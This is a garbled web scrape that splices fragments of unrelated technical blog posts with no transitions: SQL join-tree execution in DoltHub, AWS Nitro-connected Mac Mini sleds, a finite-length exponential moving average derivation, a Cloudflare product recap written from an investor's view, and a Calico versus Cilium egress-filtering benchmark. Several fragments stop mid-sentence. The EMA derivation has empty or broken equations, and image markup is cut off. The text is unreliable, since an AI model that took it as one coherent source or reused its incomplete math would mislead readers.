iterate over its right child looking for matches on the join
condition. When the right child iterator is out of rows, it gets the
next row from its left child. Eventually it runs out of rows in the
left child and returns <code>io.EOF</code> from its iterator.</p>
<p>Like everything else, this is easiest to visualize with some
examples. For all of these, we'll use one-letter table names with
single columns that match the table name. Here's a simple join between
two tables A and B:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b<span>;</span></code></pre></div>
<p>A naive query plan looks like this:</p>
<p><span>

  </a>
    </span></p>
<p>As we add additional tables to the join, they become the new root of
the tree, with the original subtree as the left child.</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c<span>;</span></code></pre></div>

    </span></p>
<p>Let's examine this last example more closely. What happens when we
open an iterator on the root <code>Node</code> of the query? It opens an iterator
on its left child, which in turn opens an iterator on its left child,
and so on. Each node, after accessing a row from its left child, then
attempts to find a matching row from its right child. We end up with
the table access order the same as in the lexical query: <code>A &gt; B &gt; C &gt;
D</code>. </p>
<p>Let's trace through the execution of a single row in the result set.</p>
<ol>
<li>The join node <code>a = b</code> gets a row from <code>A</code>. Then it iterates through
the rows of <code>B</code> looking for rows that match the join condition <code>a =
b</code>. When it finds such a row, it returns it.</li>
<li>The node <code>b = c</code> takes the row from its left child, which is a
concatenation of rows from tables <code>A</code> and <code>B</code>. It then iterates
over its right child, the rows of <code>C</code>, looking for rows that match
the join condition <code>b = c</code>. When it finds such a row, it returns
it.</li>
<li>The node <code>c = d</code> takes the row from its left child, which is a
concatenation of rows from <code>A</code> and <code>B</code> and <code>C</code>, in that order. It
then attempts to match rows from its right child, <code>D</code>, just as
above.</li>
</ol>
<p>Importantly, there are sometimes many possible binary trees that can
implement the above logic to yield a correct result for any given
table access order. The tree construction algorithm above, where we
keep shoving a sub-tree down to the left child of a new join node, is
just what the parser gives us by default because it's left
associative. But we can draw other trees that give the same
results. For example, here's a balanced join tree:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="balanced four table join" title="balanced four table join" src="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png" srcset="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/a48b3/four-table-balanced.png 214w,

  </a>
    </span></p>
<p>Like the original, this produces a table access order of <code>A &gt; B &gt; C &gt;
D</code>. If we wanted to access the tables in the opposite order, we could
simply flip the left and right children of every node in the original
tree like so:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="reversed four table join" title="reversed four table join" src="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" srcset="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/a48b3/four-table-reversed.png 214w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/47730/four-table-reversed.png 428w,

  </a>
    </span></p>
<p>Again, there are sometimes many possible join trees for a given table
ordering. But they all have one thing in common: their join conditions
refer to tables that can be found in their left and right
children. Otherwise, the node cannot evaluate its join condition. For
example, let's say that we are querying three tables and want to
access them in the order <code>B &gt; A &gt; C</code>. This is an invalid join plan
with that table ordering:</p>

            <!-- content --><p>Since this is a holiday week, and we tend to do a bit more fun content. I wanted to take a look at how Amazon AWS is adding Apple Mac Mini nodes to EC2. We recently covered the announcement in <a href="https://www.servethehome.com/amazon-aws-ec2-mac-mini-powered-macos-cloud-instances-launched/">Amazon AWS EC2 Mac Mini Powered MacOS Instances Launched</a>, but now we have some pictures of the solution.<span id="more-49658"></span></p>
<h2>How AWS Added Apple Mac Mini Nodes to EC2</h2>
<p>This is what an x86/ 10GbE Apple Mac Mini looks like in an EC2 rack. One can see that the unit is placed in a sled. Around the Mac Mini are a surprising number of wires being routed through the chassis.</p>

<p>Many of these wires terminate at the front of the sled. Here, we have an AWS Nitro controller. Amazon is now on its fourth generation of Nitro controller after starting the journey years ago.</p>

<p>We have covered this a number of times, but Nitro is effectively what the industry is trying to replicate (and expand upon) as part of the push towards DPUs. If you are not familiar with DPUs, check out our <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> and video:</p>

<p>On the front of the AWS Mac Mini sled, there is the Nitro controller. There are two <a href="https://www.servethehome.com/exclusive-gigabyte-annapurna-labs-arm-storage-server-benchmarks/">Annapurna Labs</a> branded chips, one with what looks like five DRAM packages atop the PCB and one without. There is a red cable atop the Nitro PCB that almost looks like a standard SATA cable with a 90-degree connector.</p>

<p>AWS says it is using Thunderbolt to connect to the Mac Mini. Although most logos are covered up in AWS’s screenshot, we can see what appears to be (logo partially covered by a white label) a black Belkin Thunderbolt 3 cable on the bottom of the Nitro controller. Amazon said it is using Thunderbolt to connect its Nitro controller to the Mac Mini and provide its basic suite of EBS storage, networking, and security/ management features.</p>
<h2>Final Words</h2>
<p>Something important to keep in mind here is that the Mac Mini itself is a relatively lower cost versus the rest of AWS’s infrastructure to host the node versus many of AWS’s other EC2 offerings. It is also much more complex than something like a <a href="https://www.servethehome.com/myelectronics-nl-apple-mac-mini-and-raspberry-pi-rack-review/">Mac in a Rack</a> setup that we recently featured on STH.</p>
<p><iframe title="Rackmount Apple Mac Mini and Raspberry Pi" width="696" height="392" src="https://www.youtube.com/embed/t__DW0NbJIs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Overall, the big takeaway for our readers should be the impact of the AWS Nitro and why the industry is pushing so hard on DPUs right now. AWS is effectively using its Nitro controller as the endpoint so it can abstract the nodes it is putting on its network. Instead of having to re:Invent (yes that was purposeful) a new Mac OS stack, it could leverage Nitro and deliver its services over Thunderbolt. Some of the Thunderbolt changes in the M1 generation also may partially explain why AWS is using the older x86 nodes instead of newer M1 Arm nodes.</p>

<section><p>An exponential moving average (EMA), also called an exponentially weighted moving average (EWMA), is a type of moving average where the weighting applied to generate the average decays exponentially the farther back in time you go. This is contrasted with a simple moving average (SMA) which always has a finite length but weights all the points in the series within that length equally. Due to the exponential weight decay of an EMA it does not necessitate a finite length as with an SMA. Because of this it can be a bit more efficient than an SMA when calculating the EMA on large time series data since each new data point can recursively apply the EMA from the previous data point’s EMA; contrast this with an SMA where each data point either must step through several previous points in the series to calculate the sum at each new point, or, must store the sum at each previous point in the series which is calculated before dividing by its length. Therefore if the sums are cached to improve computational efficiency there is a hit to space efficiency, if not then the computational efficiency is impaired instead.</p>

<p>However the efficiency advantage of an EMA only really applies if you are sequentially calculating the EMA one time through from some selected starting point in the time series to an end point in the series. This isnt always a viable use case, particularly if the time series data is extremely large, or even infinite, and an EMA must be calculate at arbitrary points or across small sub-sets of the data at any one time. For this reason it is common to use an EMA that has a finite length similar to an SMA, applied to past points for a finite time into the past. Because EMA weights exponentially decay, so long as the length is sufficiently large, it should closely approximate the usual case where the EMA length is infinite, or at least, goes back to the beginning of the dateset. However, like an SMA, when using a finite length there is no need to iterate across the length of past data points to calculate the EMA at each point if you cache previously calculated values. By storing the sum at each previous data point we can make this process efficient by only referencing the sum associated with the last data point and calculating our new EMA from there. Because the sum for an EMA is the same as the EMA itself, that is, there is no need to divide by the length as is the case with an SMA, we are able to calculate an EMA with a finite length with greater space efficiency than we would an SMA, only storing the EMA calculated at each point and no need to store an additional sum variable.</p>

<p>In this post I will discuss how to calculate the EMA value with a finite length efficiently without the need for iterating over past data points and how we derive the math to accomplish this.</p>

<p>First lets take a look at the equation used to calculate the EMA for any point. This equation assumes a starting point of \(V_0\); when dealing with an EMA of fixed length then our \(V_0\) would be the point in the time series that is the number of steps behind the current data point in the sequence by length.</p>

&nbsp;&nbsp;&nbsp;&nbsp;<em>\(\alpha\)</em> is the weighting coefficient. It is a value between 0 and 1,<br>
&nbsp;&nbsp;&nbsp;&nbsp;<em>\(t\)</em> the time where 0 is the start time,<br>
&nbsp;&nbsp;&nbsp;&nbsp;<em>\(V_t\)</em> the value, \(V\), at time \(t\),<br>
&nbsp;&nbsp;&nbsp;&nbsp;<em>\(S_t\)</em> the sum at time \(t\), this is the same as the EMA at time \(t\).</p>

<h2 id="example-of-length-5">Example of Length 5</h2>

<p>Lets run through all the math we need to accomplish our end goal for a fixed length of 5, then we can hopefully pick out the patterns and generalized this to any length value.</p>

<p>Say we have some series values in an array as follows.</p>

<p>$$
V = [V_0, V_1, V_2, V_3, V_4]
$$</p>

<p>Now if we take a EMA of the above series then each point in the series will have a corresponding EMA value associated with it, namely \(S_t\). The first value being trivial and is as follow.</p>

<p>$$
S_0 = V_0
$$</p>

<p>At this point each following EMA is a recursive relationship to the previous, back to, at most, the length parameter of an EMA or the first value in the series, whatever comes first. For simplicity lets presume we have an EMA length of 5. Now lets calculate the EMA at \(t=1\).</p>

<p>$$
S_1 = \left(1 - \alpha\right) \cdot S_0 + \alpha V_1
$$</p>

<p>$$
S_1 = \left(1 - \alpha\right) \cdot \underbrace{V_0}_{S_0} + \alpha V_1
$$</p>

<p>We can now take this process and apply it to the other elements in the series.</p>

<p>$$
S_2 = \left(1 - \alpha\right) \cdot S_1 + \alpha V_2
$$</p>

<p>$$
S_2 = \left(1 - \alpha\right) \cdot \overbrace{\left(\left(1 - \alpha\right) \cdot \underbrace{V_0}_{S_0} + \alpha V_1\right)}^{S_1} + \alpha V_2
$$</p>

<p>$$
S_3 = \left(1 - \alpha\right) \cdot S_2 + \alpha V_3
$$</p>

<p>$$
S_3 = \left(1 - \alpha\right) \cdot \underbrace{\left(\left(1 - \alpha\right) \cdot \overbrace{\left(\left(1 - \alpha\right) \cdot \underbrace{V_0}_{S_0} + \alpha V_1\right)}^{S_1} + \alpha V_2\right)}_{S_2} + \alpha V_3
$$</p>

<p>$$
S_4 = \left(1 - \alpha\right) \cdot S_3 + \alpha V_4

$$</p>

<p>The problem here is that if we start the process over and repeat it for every point it is horribly inefficient. With a length of 5 as seen here this entire process needs to be repeated for every point. If we have a array, \(V\) of sufficient length, and a length parameter that is of any sizable length this process becomes particularly inefficient. Remember that if there was a 6th point here after \(v_5\) we would have to start over and start at \(V_1\) rather than \(V_0\) since the length is 5 and thus would not go back to the 0 index for subsequent values in the series.</p>

<p>One way to make this more efficient is by figuring out a way of dropping \(V_0\) from the previously calculated sum before we append the next value to it. For a SMA this would be trivial subtraction but for an EMA it is a bit more complex. To see how we accomplish that we need to first expand the series above and simplify it, once we do this some patterns become evident.</p>

$$</p>

<p>Since all of our coefficients for \(V_t\) are effectively constants lets simplify that and see what it looks like.</p>

<p>$$
S_4 =

<p>At this point the pattern becomes clear. what we effectively did was we took a somewhat confusing recursive equation and unrolled it into a flat structure.

<p>It has been a busy 2020 for Cloudflare. This company is my 2nd highest position (right behind CrowdStrike) as it sits at the nexus of two of the next-gen enterprise technology waves that I follow closely - <strong><a href="https://hhhypergrowth.com/tag/edge-networks/">Edge Networks</a></strong> and<strong> <a href="https://hhhypergrowth.com/tag/cybersecurity/">Zero Trust</a></strong>. Over the second half of 2020, it has had 4 different announcement weeks: Serverless Week, Birthday Week, Zero Trust Week, and Privacy &amp; Compliance Week. They are continually moving forward at an incredibly rapid pace, and while these announcement weeks are great for seeing the product innovations, it also gives us outsiders a view into <strong>how these moves fit into the larger picture</strong>. </p><p>And whoooo-boy... were there a lot of announcements. So many that it may look like they are moving in too many directions, or seem scattered or are stretching themselves thin. But no - <em>every</em> advance Cloudflare makes is improving either their core platform (web protection and performance), or one of the key directions I am watching them move more fully into. Instead of going one-by-one through the new products and features, let's instead look at what Cloudflare had before, the key platform areas that I am watching as an investor, and how those areas advanced. </p><p>I'm going to be referencing their prior products heavily. Pop quiz: What is Magic Transit, Argo, WARP? You need to know... so let's recap their product lines &amp; features stood (at the start of summer) before we explore the new enhancements.</p><hr><figure><img src="https://hhhypergrowth.com/content/images/2020/12/cloudflare_logo.png" alt="" srcset="https://hhhypergrowth.com/content/images/size/w600/2020/12/cloudflare_logo.png 600w, https://hhhypergrowth.com/content/images/2020/12/cloudflare_logo.png 874w" sizes="(min-width: 720px) 720px"></figure><p>This is mostly a recap from my <a href="https://hhhypergrowth.com/a-cloudflare-deep-dive/">first deep dive back in February 2020</a>, with a couple of additions and clarifications.</p><h2 id="core-platform">Core platform</h2><p>Cloudflare is an edge network, currently with 51Tb+ of global network capacity that is interconnecting with nearly 9000 outside networks (ISPs, cloud providers, internet exchanges, and customers). Their edge network is generally accessed via 200 Points of Presence (POPs), strategically situated across 100 countries – putting the vast majority of the world within 100ms of their edge. They handle 18M+ web requests per second on average, hitting 25M+ protected web sites and services -- which means they typically handle ~1.5 trillion web requests a day. The insights gained from handling all that traffic then powers a threat intel system that protects the edge network and its customers, which blocks an average of 72B cyberthreats a day. </p><p>Behind the core architecture of their platform is:</p><ul><li>Software Defined Networking = Cloudflare architected their global network and backbones to be software-based, which allows for their entire edge network to be programmable. [Covered before in my <a href="https://hhhypergrowth.com/what-are-edge-networks/">Edge Networks</a> write up.]</li><li>Local Edge Routing ("Anycast") = Allows for incoming requests to the edge network to be routed to different locations; any edge server, instead of one origin server. This is what allows CDNs and edge networks to be a proxy, and provide an umbrella of services by sitting over all requests to origin servers.</li><li><a href="https://blog.cloudflare.com/argo-and-the-cloudflare-global-private-backbone/">Global Private Backbone ("Argo")</a> &nbsp;= Their private network backbones between major interconnects, which all combine into their global edge network. This allows them to efficiently monitor global network conditions, and to achieve higher speeds by routing traffic globally across those private backbones instead of over the public Internet (using Argo Smart Routing - see below). </li><li><a href="https://www.cloudflare.com/network/">Global Anycast Network</a> = Their mesh of global networks and backbones, with 200+ edge servers across the globe serving as gateways into that network. [You can see the list of POP cities in the link.] </li></ul><figure><img src="https://hhhypergrowth.com/content/images/2020/12/cloudflare_global.png" alt="" srcset="https://hhhypergrowth.com/content/images/size/w600/2020/12/cloudflare_global.png 600w, https://hhhypergrowth.com/content/images/size/w1000/2020/12/cloudflare_global.png 1000w, https://hhhypergrowth.com/content/images/2020/12/cloudflare_global.png 1500w" sizes="(min-width: 720px) 720px"><figcaption>Cloudflare's network of POPs forms a mesh covering 95% of the Internet-going populace.</figcaption></figure><p>Their edge network sits between a company's applications (web sites, web apps, or mobile apps) or services (APIs, microservices, or serverless), and the users making requests to them. Being a proxy between a <em>service</em> and the <em>users accessing it </em>has a lot of advantages, and the primary focus of Cloudflare over its first 10 years has been around 3 pillars: improving the <strong>Security</strong>, <strong>Performance</strong> and <strong>Reliability</strong> of their customers' web applications and services. &nbsp;</p><h3 id="security">Security</h3><p>Cloudflare is known mostly for its security features. Security over your web applications and services remains critical! Some tidbits from <a href="https://blog.cloudflare.com/network-layer-ddos-attack-trends-for-q3-2020/">a recent technical blog post looking at attack trends</a>: DDoS attacks are surging in 2020, and for the past 3 quarters, <strong>the number of attacks have doubled each of those quarters</strong>. </p><ul><li><a href="https://www.cloudflare.com/waf/">Web Application Firewall (WAF)</a> = A proactive next-gen firewall over your web application. Uses threat intelligence (ML &amp; signature recognition) and customizable rules to block suspicious traffic.</li><li><a href="https://www.cloudflare.com/ddos/">DDoS Protection</a> = Ensure performance of your web app or service, by making sure only legitimate traffic is hitting it. Prevents denial of service and concurrent bot attacks.</li><li><a href="https://www.cloudflare.com/products/bot-management/">Bot Management</a> = Stop automated bots in real-time, tracking both good or bad actors. Prevents common attack vectors, like application DDoS and content scraping.</li><li><a href="https://www.cloudflare.com/rate-limiting/">Rate Limiting</a> = Once traffic gets in through the WAF, provides rate limiting capabilities over your application, to curb application DDoS attacks, brute-force login attempts, and other abusive behaviors from "legitimate" requests.</li><li><a href="https://www.cloudflare.com/ssl/">SSL</a> = Provides SSL/HTTPS capabilities over your web application or service.</li><li><a href="https://www.cloudflare.com/products/cloudflare-spectrum/">Spectrum</a> = Extends these core security features to work with non-web protocols (email, FTP, SSH, MQTT, or any specialized TCP/UDP traffic, like game protocols).</li><li><a href="https://www.cloudflare.com/campaigns/">Cloudflare for Campaigns</a> = Free service protecting local, state and federal US political campaigns from attack (via DDoS and WAF).</li></ul><h3 id="performance">Performance</h3><p>Besides being a security layer, being the proxy between web services and end users also allows Cloudflare to help improve the performance of the application being called, so that it is as fast as possible. This is primarily through caching and optimization of content.</p><ul><li><a href="https://www.cloudflare.com/cdn">Content Delivery Network (CDN)</a> = Caching static content for faster delivery and greatly reduced trips to origin server.</li><li><a href="https://www.cloudflare.com/website-optimization/">Web Optimization</a> = Compressing content &amp; images for faster delivery. Automatically encode images to a variety of formats, allowing for right-sizing of images by tailoring it to the device it is viewed on (phone vs tablet vs web).</li><li><a href="https://www.cloudflare.com/products/cloudflare-stream/">Stream</a> (Video Optimization &amp; Delivery) = Compresses video for faster delivery and caches it to CDN. Automatically encodes to a variety of formats, allowing for right-sizing of video, to tailor to device it is viewed on (phone vs tablet vs web). Allows for limiting access based on geo-location, user or time-based rules.</li></ul><h3 id="reliability">Reliability</h3><p>And hand-in-hand with performance of your application comes the reliability of the entire network between a service and its users, to assure it is always available. Cloudflare provides an array of services to bolster the resilience of your site, and make sure the network there is always at the ready.</p><ul><li><a href="https://www.cloudflare.com/products/argo-smart-routing/">Argo Smart Routing</a> = Route optimization system to determine fastest route for web requests to origin. Detects real-time congestion via ML, and routes around it; think of it as the "Waze for the Internet". Finds the fastest &amp; most reliable routes over both the edge network backbone (Argo) and the overall Internet. </li><li><a href="https://www.cloudflare.com/load-balancing/">Load Balancing</a> = Allows for routing incoming Anycast requests to different origin servers, or have failover should a server go down.

Built to be highly redundant, with built-in DDoS &amp; spoof protection.</li></ul><h2 id="consumers">Consumers</h2><p>Besides their core enterprise platform, they have several consumer-facing applications.... and like their enterprise platform, it has very generous options at the free tier. In particular, it is important to understand their WARP-line of products, which is a VPN that protects the endpoint's traffic to the nearest edge server. </p><ul><li><a href="https://1.1.1.1/dns/">1.1.1.1</a> = Free &amp; fast open DNS resolution service for consumers (the lookup to determine what IP to route a web request to). Similar to what Google provides as their Public DNS server at 8.8.8.8. &nbsp;[This <a href="https://blog.cloudflare.com/announcing-1111/">blog post</a> covered the history of DNS and its issues, if you want to understand DNS better.]</li><li><a href="https://1.1.1.1/family/">1.1.1.1 for Families</a> = Family-friendly public DNS resolution servers for use on home routers, for malware and adult content blocking.</li><li><a href="https://1.1.1.1/">1.1.1.1 + WARP</a> = Free consumer VPN app for mobile (iOS and Android), and, as of this year, Mac and Windows desktop. Beyond using the 1.1.1.1 DNS service, it is a VPN that <strong>protects the network traffic between your device and the nearest edge server</strong>.</li><li>WARP+ = Paid consumer VPN service in the 1.1.1.1 app, that extends WARP<strong> by adding in Argo Smart Routing over Cloudflare's private backbones</strong>, to achieve higher speeds on web requests (30% faster on average), and gain overall better performance &amp; reliability. This leverages their enterprise-focused edge network towards consumer use.</li></ul><p>Their consumer products don't provide revenue (they are free or low-cost), but provide clues as to where their enterprise products can go, plus assuredly provides a lot of intel in their routing &amp; threat detection analytics happening over network traffic. &nbsp;</p><h2 id="connectivity">Connectivity</h2><p>All of these are the enterprise flip-side of those consumer services - they protect the traffic between a company's enterprise network or specific origin servers to the nearest edge server. </p><ul><li><a href="https://www.cloudflare.com/products/argo-tunnel/">Argo Tunnel</a> = Secure tunneling for the edge to connect to individual web apps and services. It is a lightweight agent that runs on an origin server, <strong>creating a tunnel to the nearest edge server</strong>, so traffic can route in through Cloudflare's application security -- to then take advantage of WAF, DDoS protection, rate limiting, load balancing, etc. The request and response speeds are improved via Argo Smart Routing over their private backbones.

            <p>In a 


<a href="https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/" target="_blank">recent blog
post</a>
, we
compared three different technical approaches to filtering egress traffic on Linux: IP tables, IP sets, and
BPF. While that provided some interesting baseline benchmarks of the core Linux technologies, we wanted to go
beyond that to look at how one would implement such filters in practice, using off-the-shelf cloud native
network policy solutions.</p>
<p>In the realm of the Cloud Native, it is not far-fetched to imagine a Kubernetes cluster needing egress
filtering for controlling the traffic (host or pod) attempting to leave the network to possibly wild and
dangerous endpoints on the internet. Indeed, this is a common use case for avoiding exfiltration of data by
malicious workloads.</p>
<p>One could of course build a custom egress filtering framework to suit the use case based on the existing
technologies in the Linux networking pipeline. Or one could take advantage of the Kubernetes CNI plugins that
already offer similar functionality.</p>
<p>Our friends at SAP asked us to perform a benchmark of the two most widely used Kubernetes CNIs, Calico and
Cilium, for this task. This blog post presents the methodology and results from benchmarking Calico and Cilium
deployed on a 


<a href="https://kinvolk.io/lokomotive-kubernetes/" target="_blank">Lokomotive</a>
 cluster.</p>
<h2 id="goals">Goals</h2>
<p>We had the following goals going into this study:</p>
<ul>
<li>Provide a reproducible benchmark framework that anyone can download and use.</li>
<li>Compare the scalability and potential performance overhead by Kubernetes CNI plugins such as Calico and
Cilium against using the underlying Linux filtering mechanisms (IP sets and eBPF, respectively).</li>
</ul>
<h2 id="about-calico">About Calico</h2>
<p>


<a href="https://www.projectcalico.org/" target="_blank">Calico</a>
 is the most popular open source CNI plugin for Kubernetes, according
to the recent 


<a href="https://www.datadoghq.com/container-report/" target="_blank">Datadog container survey</a>
. Calico not only
provides networking but also offers policy isolation for securing the Kubernetes cluster using advanced
ingress and egress policies.</p>
<p>Calico provides a choice of dataplane including a standard Linux networking dataplane (default), a pure Linux
eBPF dataplane and a Windows HNS dataplane.</p>
<h2 id="about-cilium">About Cilium</h2>
<p>


<a href="https://cilium.io/" target="_blank">Cilium</a>
, an increasingly popular open source Kubernetes CNI plugin, leverages eBPF to
address the networking challenges of container workloads such as scalability, security and visibility. Cilium
capabilities include identity-aware security, multi-cluster routing, transparent encryption, API-aware
visibility/filtering, and service-mesh acceleration.</p>
<h2 id="network-policies">Network Policies</h2>
<p>Kubernetes network policies are defined using the Kubernetes NetworkPolicy resource. However, Kubernetes
itself does not enforce network policies, and instead delegates their enforcement to the network plugins, in
our case Calico or Cilium.</p>
<p>Kubernetes NetworkPolicy resource is an application-centric construct i.e. it allows you to specify how a pod
is allowed to communicate with others Pods, Services, external Ingress or Egress traffic. However, it cannot
be used to enforce rules on a node or cluster level. Hence for egress filtering, we create network policies
using these CNI plugins’ custom APIs.</p>
<p>Calico provides its NetworkPolicy, GlobalNetworkPolicy and GlobalNetworkSet API objects which provide
additional features such as order, namespace scoped or cluster-wide enforcement of policies.</p>
<p>For Calico, we used GlobalNetworkSet API passing a  list of CIDRs that we want to deny egress to and then
reference the GlobalNetworkSet resource in the GlobalNetworkPolicy via label selectors.</p>
<p>Under the hood, this setup is similar to using IP sets for filtering egress traffic. Calico uses
GlobalNetworkSet to create IP sets and GlobalNetworkPolicy to update the iptables matching the IP set.</p>
<p>Cilium, on the other hand, uses eBPF as the underlying technology to enforce network policies. A Cilium agent
running on each host translates the network policy definitions to eBPF programs and eBPF maps and attaches
them to different eBPF hooks in the system. Network policy definitions are created with the help of
CiliumNetworkPolicy and CiliumClusterwideNetworkPolicy custom resources for namespace scoped and cluster-wide
network traffic respectively.</p>
<p>For Cilium, we used CiliumClusterwideNetworkPolicy API passing a list of CIDRs to deny egress and match the
policy using label selectors for both application workloads and network traffic on the host.</p>
<h2 id="metrics">Metrics</h2>
<p>Filtering network traffic could be a costly operation, especially if the number of rules to check is
considerably high — such as in millions (as is the case with a real-world scenario we are working on).
Throughput, CPU usage and latency must all be measured to provide a meaningful conclusion for the technologies
to be used.</p>
<p>We have used the following metrics to measure the performance of the filters:</p>
<ul>
<li>Throughput</li>
<li>CPU usage</li>
<li>Latency</li>
</ul>
<p>For a Kubernetes CNI an equally important metric is <code>Set-up time</code>. Since Calico/Cilium delegates the
responsibilities to the underlying technologies, we want to capture the time taken by the CNI plugin to
process the created API objects and enforce the network policies for egress filtering.</p>
<h2 id="scenario">Scenario</h2>
<p>The scenario for this test is, as in our



<a href="https://kinvolk.io/blog/2020/09/performance-benchmark-analysis-of-egress-filtering-on-linux/" target="_blank">previous</a>

egress filtering benchmark, composed of a client and a server computer that communicate through an IP network.
The egress filtering is performed on the client machine and there is no filtering performed on the server
side.</p>
<p>We test five possible mechanisms for doing the filtering:</p>
<ul>
<li>iptables, “raw” IP sets and tc-eBPF test application, as in the previous benchmark (retesting to ensure
consistency)</li>
<li>Calico and Cilium, in both cases running the client application in a pod in a Lokomotive Kubernetes cluster,
with the solution under test running as the Kubernetes CNI plug-in.</li>
</ul>
<p>In addition, for a baseline reference, we also ran the test without any filtering mechanism in place.</p>
<p>This is shown in the following diagram:</p>
<figure>
  <img src="https://kinvolk.io/media/2020-12-23-egress-filtering-with-calico-cilium/scenario.svg">
</figure>
<h2 id="benchmark-set-up">Benchmark Set-up</h2>
<p>As mentioned earlier, our set-up builds on the work of the existing framework.  Hence the software and
hardware profiles used to benchmark IP sets and tc-eBPF largely remain the same, except for the following
changes:</p>
<ul>
<li>Updated software versions for Flatcar, ipset, iperf and the Linux kernel.</li>
<li>Two Lokomotive clusters with one worker node to run the benchmarks, one each for Calico and Cilium.</li>

<p>To perform the test we used the following bare metal servers running on 


<a href="https://metal.equinix.com/" target="_blank">Equinix
Metal</a>
:</p>
<ul>
<li>2 machines as client and server machines for IP set and tc-eBPF filters.</li>
<li>2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Calico.</li>
<li>2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Cilium.</li>
</ul>
<p>The specifications of all the machines used were:</p>
<div><pre><code data-lang="shell">c2.medium.x86
1x AMD EPYC 7401P 24-Core Processor @ 2.0GHz
2x 120GB SSD

<p>Kubernetes is deployed using 


<a href="https://kinvolk.io/lokomotive-kubernetes/" target="_blank">Lokomotive</a>
. We used two separate
clusters for this benchmark, to isolate comparison of Calico and Cilium from interfering with each other.</p>
<h4 id="calico">Calico</h4>
<p>Calico offers a choice of dataplane options, including standard Linux networking (its default) and eBPF.
However, Calico’s eBPF dataplane doesn’t support host endpoints, which means that node-level egress filtering
is not possible with it. Hence, we use the default standard Linux networking dataplane for our tests.</p>
<h4 id="cilium">Cilium</h4>
<p>Cilium with its eBPF based dataplane is installed on Lokomotive using a 


<a href="https://github.com/kinvolk/lokomotive/blob/imran/cilium-instead-of-calico/assets/terraform-modules/bootkube/resources/charts/cilium.yaml" target="_blank">modified default
configuration</a>

to support our test scenario. The changes are as follows:</p>
<ul>
<li>Increase the number of entries in the endpoint policy map to the maximum limit allowed; i.e. 65536.</li>
<li>Enable host firewall for enforcing host network policies.</li>
<li>The network interface name on which the host firewall applies.</li>
</ul>
<h4 id="software-versions">Software Versions</h4>
<p>The exact versions of all the tools we used are:</p>
<ul>
<li>Flatcar Container Linux by Kinvolk Alpha (2705.0.0)</li>
<li>Linux kernel 5.9.11</li>
<li>iperf 3.6 (in a Docker container with the host network)</li>
<li>iptables v1.6.2</li>
<li>ipset v7.6, protocol version: 7</li>
<li>Lokomotive v0.5.0 for Calico; Cilium feature branch for installing Lokomotive with Cilium</li>
<li>Kubernetes v1.19.4</li>
<li>Calico v3.16.4</li>
<li>Cilium v1.9.0</li>
</ul>

.</p>
<h3 id="tests">Tests</h3>
<p>We used the following parameters for each of the tests:</p>
<ul>
<li>
<p>Throughput: The goal of this test is to maximize throughput, ignoring CPU consumption (i.e. CPU will
typically be saturated). Therefore, iperf3 was used with the bandwidth set to 10Gbps (equal to the network
interface adapter speed) and UDP Packet size set to 1470. Throughput is tested in Gbps; we have not measured
throughput in packet per second (pps) but that could be added in the benchmark framework
(see 


<a href="https://github.com/kinvolk/egress-filtering-benchmark/issues/16" target="_blank">issue #16</a>
).</p>
</li>
<li>
<p>CPU usage: In this test we want to see the variation in CPU usage for a given throughout. Therefore, we
again use iperf3 but reduce the bandwidth to 1G. UDP Packet size remains at 1470.</p>
</li>
<li>
<p>Latency: To test latency, we bombard the server with ICMP packets using the ping utility at a rate of 1000
pings per millisecond.</p>
</li>
<li>
<p>Setup Time: As we discussed in our first egress filtering benchmark, set-up time is an implementation-detail
specific to the benchmarking application and most certainly can be improved upon. Setup time for Calico and
Cilium is calculated using ‘ping’ (ICMP) on a polling basis, checking the enforcement of policies on each
poll.</p>
</li>
</ul>
<h3 id="reproducibility">Reproducibility</h3>
<p>All the tools and instructions to reproduce these tests are provided in the GitHub repository



<a href="https://github.com/kinvolk/egress-filtering-benchmark" target="_blank">github.com/kinvolk/egress-filtering-benchmark
</a>
</p>
<h3 id="constraints">Constraints</h3>
<ul>
<li>
<p>To avoid the error <code>etcdserver: Request entity too large</code> multiple NetworkPolicy manifests (for Cilium and
Calico) are created with each containing a maximum of 50000 CIDR entries. When the number of rules increases,
more manifests are created and sent to the Kubernetes API server.</p>
</li>
<li>
<p>One possible source of error in testing is if the Kubernetes API server and etcd themselves become a
bottleneck for requests, especially when a lot of resources are created in a short span of time. since both
Calico and Cilium use them extensively. Therefore, Controller nodes were chosen such that they can …</p></li></ul></div></div>

<p><img src="http://www.wjwh.eu/images/ruby_logo.png" title="Ruby logo"><br>
